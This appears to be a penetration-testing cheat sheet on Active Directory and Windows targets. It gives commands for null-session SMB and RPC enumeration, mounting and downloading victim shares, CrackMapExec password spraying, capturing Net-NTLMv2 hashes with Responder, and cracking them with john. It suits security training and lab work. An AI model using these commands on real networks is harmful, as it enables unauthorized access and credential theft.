# Active Directory & Windows Machines {-}

## Interesting Windows ports {-}

- 88 Kerberos
- 139 NetBIOS session service
- 445 Server Message Block **SMB**
- 389 LDAP
- 1433 ms-sql
- 5985-5986 WinRM

> [!] NOTE: NetBIOS session service facilitates authentication aross a windows workgroup or domain and provides access to resources (such as files and printers)


## SMB connection with smbclient and smbmap {-}

**smbclient** is a tool that allows attacker to enumerate and list the shared resources of a machine that have the smb service on. 
You can start by using smbclient with a Null session by using the `-N` argument

```bash
smbclient -L 10.10.10.10 -N
```

As soon as you have listed those resources you can use **smbmap** to check the access, read or write rights that you have. You can also
specify the Null session by using the `-u 'null'` argument

```bash
smbmap -H 10.10.10.10 -u 'null'
smbmap -H 10.10.10.10 -u " " -p " "
```

As soon as you find a resource that you can access, you can use **smbclient** to connect to it. Again you can use the `-N` argument to tell
smbclient that you want to connect without asking for credentials.

```bash
smbclient //10.10.10.10/<Accessible resource>
```

> [!] NOTE: smbclient don't provide you a shell but a tool. **get filename.txt** allows you to download a resource if you are connected

If you see that you have access to the desired resource, you can mount the shared directory to your attacker machine.

```bash
mkdir /mnt/smbvictim
mount -t cifs "//10.10.10.10/<Accessible resource>" /mnt/smbvictim
```

You can also mount a directory with user credentials in order to get more information

```bash
mount -o user=<username> -t cifs //10.10.10.10/<folder> /mnt/smbvictim/
```

> [!] NOTE: A mounted partition is not a download of victim folders and file. That's only an access pass. Type `unmount /mnt/smbmounted` to close the
> mounted share.

One interesting point with smb is that there is some specified rights at the smb level that can varied. That means that it's not because the
shared resource is on READ ONLY mode that all the folders that this resource contains can not have a write right. You can check if some repository of 
this resource are writable with the **smbcacls** tool. The interesting right that we want to check is the Everyone.

```bash
smbcacls "10.10.10.10/<Accessible resource>" Users/amanda -N
```

The output will look as following:

```{r, echo = FALSE, fig.cap="smbcacls read right", out.width="90%"}
knitr::include_graphics("images/cacls-read.png")
```

It's interesting to mount the resource in the attacker machine because can do a one liner loop to check multiple folders rights filtering the information
by the Everyone key word.

```bash
cd /mnt/smbvictim/Users
ls -l | awk 'NF{print $NF}' | while read directory; do echo -e "\n[+] Directory $directory; smbcacls "10.10.10.10/<Accessible resource>" Users/$directory -N | grep -i everyone ; done
```

If you find a directory that have writable rights, something that can be intersting to check is that if you create a file in it, is somebody
manipulating it (remove it, writing on it, removing his content etc.). If it's the case, attacker have a way of stolling the hash NTLMv2 with
malicious **scf** file

## Get all files in a smb directory with smbget {-}

Using the mounted option is interessting, but sometimes attacker will find more convenient to download all the shared files in the attacker machine.
For this purpose, you can use the **smbget** utility.

```bash
smbget -R smb://10.10.10.10/<Accessible resource> -U username
```

Also possible for a specific folder inside the resource

```bash
smbget -rR smb://10.10.10.10/<Accessible resource>/directoryA/directoryB -U username
```

## Search for specific file with smbmap {-}

```bash
smbmap -R <Accessible resource> -H 10.10.10.10 -A Groups.xml -q 
```

## Enumerate machines and check user validity by SAMBA with CME {-}

**CrackMapExec** (a.k.a **CME**) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.

```bash
cme smb 192.168.0.0/24
```

**CME** can also enumerate a single machine,

```bash
cme smb 10.10.10.10
```

If we have credentials of a user, you can use **CME** to check the validity of a user. If the user with the password exists, the tool will
write a red plus sign, if not, a minus sign. And if the user exists and this one have admin priviledges on machines, **CrackMapExec** will
return a red plus sign and you will see a (Pwn3d!) in the result.

```bash
cme smb 10.10.10.10 -u 'user' -p 'password1'
```

You can also check the validity of multiple users with some discovered passwords

```bash
cme smb 10.10.10.10 -u users.txt -p passwords.txt
```

Here, something that can be interesting is to list the shared recourses for this user

```bash
cme smb 10.10.10.10 -u 'user' -p 'password1' --shares
```

## Sniffing traffic for SAMBA Relay with responder {-}

When SAMBA is created, by default SAMBA cert is not signed. That means that by default it's not possible to validate the origin legitimity. 
In this case Attacker can use tools like responder in order to sniff SAMBA communication traffic.

```bash
cd /usr/share/responder
# config file is in Responder.conf
python3 Responder.py -I eth0 -rdw
```

As soon as a connection is launched, you can see the communication. And because the SAMBA is not signed you can then get the **Hash Net-NTLMv2** of users.

```{r, echo = FALSE, fig.cap="Hash Net-NTLMv2 Sniffing", out.width="90%"}
knitr::include_graphics("images/ad-hashnetntlmv2.png")
```

What attacker can do with this hash?

1. copy hashes in a file (*hashes*)
1. bruteforce hashes file with john

    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes
    ```

## RPC connection with rpcclient {-}

**Remote Procedure Call** aka **RPC** is a network protocol that allows to make calls of precedures on an external computer with an 
application server. This protocol is used in a client-server model in order to ensure the communication between the client, the server and
between possible intermediaries.

In the enumeration phase, attacker can check if it's possible to connect with a null session using the **rpcclient** with the `-U ""` arguments

```bash
rpcclient -U "" 10.10.10.10 -N
```

The connection with a valid user will be done as following

```bash
rpcclient -U "user%password" 10.10.10.10 -c <command>
```

Interesting command to execute with rpcclient are:

```bash
rpcclient -U "user%password" 10.10.10.10 -c 'enumdomusers'
rpcclient -U "user%password" 10.10.10.10 -c 'enumdomgroups'
# get the rid of domain admins -> 0x200 in this example
rpcclient -U "user%password" 10.10.10.10 -c 'querygroupmem 0x200'
# get the rid of the users -> 0x1f4 for example
rpcclient -U "user%password" 10.10.10.10 -c 'queryuser 0x1f4'
```

We can also prepare a list of users for a possible Asproasting Attack.

```bash
cd content
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" 
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' 
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v 
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]'
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > users.txt
```

## Enumerate ldap service with nmap {-}

```bash
locate .nse | grep "ldap"
```

```bash
nmap --script ldap\* 10.10.10.10 -oN ldapScan
```

## LDAP Port Get Domain objects with windapsearch {-}

```bash
git clone https://github.com/ropnop/windapsearch.git
pip install python-ldap #or apt-get install python-ldap
./windapsearch.py -d DOMAIN --dc-ip 10.10.10.10 -U
```

## LDAP enum with GetADUsers.py {-}

```bash
impacket-GetADUsers DOMAIN/ -dc-ip 10.10.10.10 -debug
```
